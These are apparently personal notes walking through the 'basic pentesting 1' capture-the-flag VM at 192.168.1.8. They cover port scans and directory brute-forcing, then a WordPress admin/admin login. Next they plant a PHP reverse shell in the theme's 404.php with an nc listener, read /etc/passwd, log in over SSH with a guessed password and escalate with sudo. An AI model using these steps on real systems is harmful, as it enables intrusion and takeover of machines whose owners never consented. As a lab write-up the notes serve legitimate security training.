##################basic pentesting 1#########

$netdiscover -i wlp2s0

$nmap -sV -Pn -p- 192.168.1.8 -oA nmap_output -T5


#####open ports
21	ftp	proftpd 1.2.2c
22 	ssh	openssh 7.2.p2
80	http	Apache httpd 2.4.18




$dirb http://192.168.1.8/ raft/data/wordlists/raft-large-directories.txt

	- dirb finds that there is a directory called /secret/wp-admin
	- when we try to get that page , it redirects to another page
	- fire up burp suite , intercept the request 
	
	- 	GET /secret/wp-login.php?redirect_to=http%3A%2F%2F192.168.1.8%2Fsecret%2Fwp-admin%2F&reauth=1 HTTP/1.1
		Host: vtcsec
		Upgrade-Insecure-Requests: 1
		User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
		Accept-Encoding: gzip, deflate
		Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
		Cookie: wordpress_test_cookie=WP+Cookie+check
		Connection: close

	- so it sends us to wp-login.php but host is vtcsec 
	- go to /etc/hosts file and write 192.168.1.8 vtcsec 
	- now vtcsec is vulnerable machine's hostname
	- go back to browser now it sends us to wp-admin login page
	- first try admin, admin
	- yes we are in
	
	- now we will upload a php shell
	- go to appearance->editor select theme to edit = twentyfifteen select file 404.php
	- now paste the php reverse shell from pentest monkey
	- change ip and port
	- set nc to listen from that port nc -l 5555
	- then go to http://192.168.1.8/secret/wp-content/themes/twentyfifteen/404.php
	- now we got a shell
	
$cat /etc/passwd
	marlinspike:x:1000:1000:marlinspike,,,:/home/marlinspike:/bin/bash 
	
	- see that there is a user marlinspike
	- try to get an ssh connection with that name
$ssh -l marlinspike 192.168.1.8   and password is marlinspike
	- we are in
$sudo su - root
	- we are root
